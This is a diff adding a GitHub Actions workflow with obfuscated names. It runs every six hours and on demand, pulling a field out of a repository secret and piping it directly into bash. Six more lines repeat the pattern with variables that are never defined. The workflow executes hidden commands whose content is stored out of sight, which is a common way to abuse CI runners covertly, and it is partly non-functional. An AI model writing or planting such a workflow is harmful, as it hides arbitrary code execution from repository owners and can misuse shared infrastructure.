@@ -1,0 +1,23 @@
+name: ghaudhl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ghaudhl
+        env:
+          c51: ${{ secrets.c51 }}
+        run: |
+          echo $c51 | jq -r .m802 | /bin/bash
+          echo $w64 | jq -r .thkgv20 | /bin/bash
+          echo $zxv27531 | jq -r .bgkv2 | /bin/bash
+          echo $ma0 | jq -r .rg09 | /bin/bash
+          echo $f64 | jq -r .owh478 | /bin/bash
+          echo $sl854 | jq -r .yij689 | /bin/bash
+          echo $db71 | jq -r .alqx0879 | /bin/bash
+
